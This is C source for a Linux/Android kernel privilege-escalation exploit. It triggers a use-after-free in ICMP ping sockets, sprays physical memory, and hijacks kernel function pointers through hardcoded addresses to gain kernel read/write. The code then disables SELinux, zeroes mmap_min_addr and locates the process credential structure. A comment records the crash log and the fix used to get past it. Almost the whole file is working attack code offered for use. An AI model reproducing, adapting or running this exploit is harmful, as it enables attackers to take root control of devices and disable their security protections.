#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include<fcntl.h>
#include<errno.h>
#include<limits.h>
#include<signal.h>
#include<string.h>
#include<time.h>
#include<pthread.h>
#include<sys/wait.h>
#include<sys/sysinfo.h>
#include<sys/types.h>
#include<sys/mman.h>
#include<sys/socket.h>
#include<linux/in.h>
#include<linux/sockios.h>

#define PAGE_SIZE			  4096
#define SIOCGSTAMPNS 			  0x8907
#define MAGIC_VALUE 			  0x4B5F5F4B
#define NSEC_PER_SEC                      1000000000
#define MAX_VULTRIG_SOCKS_COUNT           4000
#define MAX_PHYSMAP_SIZE                  120*1024*1024
#define MAX_PHYSMAP_SPRAY_PROCESS         5

int   vultrig_socks[MAX_VULTRIG_SOCKS_COUNT];
void* physmap_spray_pages[(MAX_PHYSMAP_SIZE / PAGE_SIZE) * MAX_PHYSMAP_SPRAY_PROCESS];
int   physmap_spray_pages_count;

int maximize_fd_limit()
{
	struct rlimit rlim;
	int ret;
	
	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	//printf("rlim.rlim_cur: 0x%x, rlim.rlim_max:0x%x\n",rlim.rlim_cur,rlim.rlim_max);

	rlim.rlim_cur = rlim.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rlim);

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	return rlim.rlim_cur;
}

int physmap_spray_func(){
	void* mapped;
	void* mapped_page;
	int i,j;

	memset(physmap_spray_pages,0,sizeof(physmap_spray_pages));
	physmap_spray_pages_count = 0;

	for(i = 0; i < MAX_PHYSMAP_SPRAY_PROCESS; i++){
		mapped = mmap(NULL, MAX_PHYSMAP_SIZE , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
		if(MAP_FAILED == mapped){
			printf("[*] physmap_spray_func: mmap fail, size is wrong\n");
			exit(-1);
		}
		memset((char *)mapped,0x41,MAX_PHYSMAP_SIZE);

		for(j = 0; j < MAX_PHYSMAP_SIZE/PAGE_SIZE; j++){
			mapped_page = (void*)((char*)mapped + PAGE_SIZE*j);
			*(unsigned long *)((char*)mapped_page+0x1D8) = MAGIC_VALUE + physmap_spray_pages_count;
			physmap_spray_pages[physmap_spray_pages_count] = mapped_page;
			physmap_spray_pages_count++;
		}
	}
	return 0;
}

int search_exploitable_socket(int* index, void** payload)
{
    struct    timespec time;
    uint64_t  value;
    void*     page     =  NULL;
    int       j        =  0;
    int       exp_sock = -1;
    int       got      =  0;

    do{
        exp_sock = vultrig_socks[*index];
        memset(&time, 0, sizeof(time));
        ioctl(exp_sock, SIOCGSTAMPNS, &time);
        value = ((uint64_t)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;

        for(j = 0; j < physmap_spray_pages_count; j++){
            page = physmap_spray_pages[j];
            if(value == *(unsigned long *)((char *)page + 0x1D8)){
                printf("[*] magic:%p\n", value);
                got = 1;
                *payload = page;
				printf("hit the mmap page : 0x%x\n",j);
                break;
            }
        }
        *index = *index + 1;
    }while(!got && *index < MAX_VULTRIG_SOCKS_COUNT);

    if(got == 0){
        return -1;
    }
    else{
        return exp_sock;
    }
}

int kernel_read(void* kernel_addr, unsigned long* value, unsigned int len){
	int pipefd[2];
	pipe(pipefd);
	write(pipefd[1],kernel_addr,len);
	read(pipefd[0],value,len);
	return 0;
}

int kernel_write(void* kernel_addr, unsigned long* value, unsigned int len){
	int pipefd[2];
	pipe(pipefd);
	write(pipefd[1],value,len);
	read(pipefd[0],kernel_addr,len);
	return 0;
}


int main(){
	int i;	// for-loop

	struct sockaddr_in addr1;
	struct sockaddr_in addr2;
	memset(&addr1,0,sizeof(addr1));
	memset(&addr2,0,sizeof(addr2));
	addr1.sin_family = AF_INET;
	addr2.sin_family = AF_UNSPEC;

	printf("[+] set RLIMIT_NOFILE\n");
	maximize_fd_limit();

	printf("[+] socket prepare...\n");
	for(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)
	{
		vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
		connect(vultrig_socks[i], &addr1, sizeof(addr1));
	}

	// avoid error: Unable to handle kernel paging request at virtual address 00001360
	printf("[+] mmap 0x1000-0x2000...\n");
	system("echo 4096 > /proc/sys/vm/mmap_min_addr");
	void* user_mm = mmap((void *)0x1000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);
	memset((char *)user_mm,0x90,0x1000);

	printf("[+] generate vuln sockets...\n");
	for(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)
	{
		connect(vultrig_socks[i], &addr2, sizeof(addr2));
		connect(vultrig_socks[i], &addr2, sizeof(addr2));
	}

	printf("[+] physmap spray begin...\n");
	physmap_spray_func();
	printf("[+] physmap spray end!!!\n");

	printf("[+] finding target socket...\n");
	int exp_sock,exp_sock_index;
	void* payload;

	exp_sock_index = 0;
	exp_sock = search_exploitable_socket(&exp_sock_index,&payload);
	if(exp_sock == -1){
		printf("cannot find target socket\n");
	}else{
		printf("find it 1!!! exp_sock_index: 0x%x\n",exp_sock_index);
	}

/*
error:
Unable to handle kernel paging request at virtual address 4141414141414141
pgd = ffffffc025c47000
[4141414141414141] *pgd=0000000000000000
Internal error: Oops: 94000005 [#1] PREEMPT SMP
CPU: 0 PID: 999 Comm: exp-test Not tainted 3.10.0+ #63
task: ffffffc03ed48980 ti: ffffffc025c94000 task.ti: ffffffc025c94000
PC is at ip_mc_drop_socket+0x38/0xac
LR is at ip_mc_drop_socket+0x24/0xac
pc : [<ffffffc000402530>] lr : [<ffffffc00040251c>] pstate: 60000145

why:
ROM:FFFFFFC000402528                 LDR             X19, [X22,#0x290]
ROM:FFFFFFC00040252C                 CBZ             X19, loc_FFFFFFC00040258C
ROM:FFFFFFC000402530
ROM:FFFFFFC000402530 loc_FFFFFFC000402530                    ; CODE XREF: ip_mc_drop_socket+90â†“j
ROM:FFFFFFC000402530                 LDR             X1, [X19]

solve:
let [X22,#0x290] be 0
*/

	*(unsigned long *)((char*)payload + 0x290) = 0;
	*(unsigned long *)((char*)payload) = (unsigned long)0xFFFFFFC00035D788;
	*(unsigned long *)((char*)payload + 0x28) = payload;
	*(unsigned long *)((char*)payload + 0x68) = (unsigned long)0xFFFFFFC00035D7C0;
	close(exp_sock);

	printf("[*] now we can R/W kernel address space like a boss.\n");

	// disable selinux
	unsigned int set_selinux = 0;
	kernel_write((void*)0xFFFFFFC00065399C,&set_selinux,4);

	// set mmap_min_addr
	unsigned long set_mmap_min = 0;
	kernel_write((void*)0xFFFFFFC000652148,&set_mmap_min,8);
	user_mm = mmap((void*)0x0,PAGE_SIZE,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);

	// leak task_struct addr to 0x18
	exp_sock = search_exploitable_socket(&exp_sock_index,&payload);
	if(exp_sock == -1){
		printf("cannot find target socket\n");
	}else{
		printf("find it 2!!! exp_sock_index: 0x%x\n",exp_sock_index);
	}
	*(unsigned long *)((char*)payload + 0x290) = 0;
	*(unsigned long *)((char*)payload) = (unsigned long)0xFFFFFFC0004AA518;
	*(unsigned long *)((char*)payload + 0x28) = payload;
	close(exp_sock);

	void* task_struct_addr = 0;
	task_struct_addr = (void*)*(unsigned long*)((char*)user_mm+0x18);
	printf("task_struct addr is : %p\n",task_struct_addr);

	void* cred_addr = 0;
	kernel_read((char*)task_struct_addr+0x398,&cred_addr,8);
	printf("cred addr: %p\n",cred_addr);

	getchar();

	return 0;
}